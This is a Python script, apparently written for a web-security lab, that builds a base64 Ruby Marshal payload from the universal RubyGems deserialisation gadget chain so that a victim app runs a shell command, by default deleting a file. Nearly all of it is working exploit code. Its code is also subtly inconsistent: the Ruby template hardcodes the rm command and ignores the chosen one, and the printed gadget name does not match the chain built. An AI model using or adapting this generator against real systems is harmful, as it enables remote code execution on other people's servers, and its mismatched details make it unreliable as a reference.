#!/usr/bin/env python3
"""
https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
"""

import subprocess
import sys
import os
import time

# ============ EDITAR ACA ============
COMMAND    = "rm /home/carlos/morale.txt"   # comando a ejecutar en la victima
RUBY_IMAGE = "ruby:3.0-slim"                # solo para FORJAR (el target puede tener otra version)
# ====================================

HERE = os.path.dirname(os.path.abspath(__file__))
DOCKER_DESKTOP = r"C:\Program Files\Docker\Docker\Docker Desktop.exe"


def docker_ok() -> bool:
    """True si el engine de Docker responde."""
    return subprocess.run(
        ["docker", "info"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    ).returncode == 0


def ensure_docker() -> bool:
    """Si Docker no esta arriba, intenta levantar Docker Desktop y espera."""
    if docker_ok():
        return True
    print("[*] Docker no responde. Levantando Docker Desktop...")
    try:
        subprocess.Popen([DOCKER_DESKTOP])
    except FileNotFoundError:
        pass
    print("[*] Esperando a que arranque el engine...")
    for _ in range(60):
        time.sleep(2)
        if docker_ok():
            return True
    return False


def ruby_single_quoted(s: str) -> str:
    """Convierte un string de Python en un literal Ruby entre comillas simples (sin interpolacion)."""
    return "'" + s.replace("\\", "\\\\").replace("'", "\\'") + "'"


def build_ruby(command: str) -> str:
    """Codigo Ruby que forja el gadget Rails"""
    cmd = ruby_single_quoted(command)
    return f'''
require "base64"
require "erb"
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])

STDOUT.write Base64.strict_encode64(payload)
'''


def copy_to_clipboard(text: str) -> None:
    """Copia al portapapeles de Windows via clip.exe."""
    try:
        subprocess.run(["clip"], input=text, text=True, check=False)
    except Exception:
        pass


def resolve_command() -> str:
    if len(sys.argv) > 1 and sys.argv[1].strip():
        return sys.argv[1].strip()
    return COMMAND


def main() -> int:
    command = resolve_command()

    if not ensure_docker():
        print("[X] Docker no arranco. Abri Docker Desktop a mano y volve a correr.")
        return 1
    print(f"[+] Docker OK  (imagen: {RUBY_IMAGE})")

    rb_path = os.path.join(HERE, "_gen_rails.rb")
    with open(rb_path, "w", encoding="utf-8", newline="\n") as f:
        f.write(build_ruby(command))

    try:
        result = subprocess.run(
            ["docker", "run", "--rm", "-v", f"{HERE}:/work", "-w", "/work",
             RUBY_IMAGE, "ruby", "/work/_gen_rails.rb"],
            capture_output=True, text=True,
        )
    finally:
        try:
            os.remove(rb_path)
        except OSError:
            pass

    payload = result.stdout.strip()
    if not payload:
        print("[X] No se genero payload. Salida de error de Ruby:")
        print(result.stderr)
        return 1

    print("[*] Gadget: ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy -> ERB#result")
    print(f"[*] Comando: {command}")
    print()
    print("=================== BASE64 (Marshal) ===================")
    print(payload)
    print("=======================================================")

    copy_to_clipboard(payload)
    print("[+] Copiado al portapapeles")
    print("[i] Para inspeccionar los bytes:  python deserialize.py <base64>")
    print("[i] Se dispara cuando la app llama CUALQUIER metodo sobre el objeto deserializado.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
